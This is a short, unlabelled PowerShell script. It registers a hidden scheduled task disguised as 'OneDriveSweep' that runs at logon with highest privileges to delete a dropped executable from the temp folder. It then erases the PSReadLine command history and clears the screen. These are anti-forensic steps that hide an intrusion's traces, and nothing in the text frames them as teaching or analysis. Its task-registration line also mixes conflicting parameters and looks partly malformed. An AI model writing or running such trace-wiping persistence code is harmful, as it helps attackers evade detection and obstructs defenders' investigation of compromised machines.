$action = New-ScheduledTaskAction -Execute 'powershell' -Argument 'rm "$env:TMP\bORG2.exe" -r -Force -ErrorAction SilentlyContinue'
$trigger = New-ScheduledTaskTrigger -AtLogon
$principal = New-ScheduledTaskPrincipal -UserID 'DOMAIN\user' -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -Hidden -RunOnlyIfNetworkAvailable
$task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings
Register-ScheduledTask T1 -InputObject $task -Force -TaskName OneDriveSweep -User $env:UserName
Remove-Item (Get-PSreadlineOption).HistorySavePath
cls
exit
